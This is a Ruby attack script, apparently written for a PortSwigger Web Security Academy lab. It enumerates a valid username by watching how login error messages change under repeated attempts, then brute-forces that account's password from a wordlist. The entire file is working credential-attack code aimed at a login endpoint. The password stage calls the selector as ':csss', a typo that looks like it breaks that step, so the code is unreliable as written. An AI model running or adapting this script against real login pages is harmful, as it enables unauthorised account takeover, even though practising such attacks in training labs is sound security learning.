require 'http'
require 'nokogiri'

$url='https://0a6a0041041d48f4807d949300540064.web-security-academy.net/login'

fhu = File.new 'users.txt','r'
fhp = File.new 'passwd.txt','r'

users = fhu.readlines
passwd = fhp.readlines

fhu.close
fhp.close

counter = 0

valid_username = ''

# Enumerate Valid Username 
users.count.times  do |i|
	sleep 2 
	5.times {$resp = HTTP.post($url,:form => {:username=>"#{users[i].chomp}",:password=>"test"})}
	resph = Nokogiri.parse $resp.body.to_s
	resp_err = resph.search(:css,'p.is-warning').text
	if resp_err!='Invalid username or password.'
		print "Username : #{users[i].chomp}" 
		valid_username = users[i].chomp
		break
	end
end

# Enumerate Valid Password 
passwd.count.times do |i|
	resp = HTTP.post($url,:form => {:username=>"#{valid_username}",:password=>"#{passwd[i].chomp}"})
	code = resp.code
#Change it to checking if the error message is empty or not
	resph = Nokogiri.parse resp.body.to_s
	resp_err = resph.search(:csss,'p.is-warning').text
	if resp_err.length==0
		puts "#{passwd[i].chomp}"
		break
	end
end

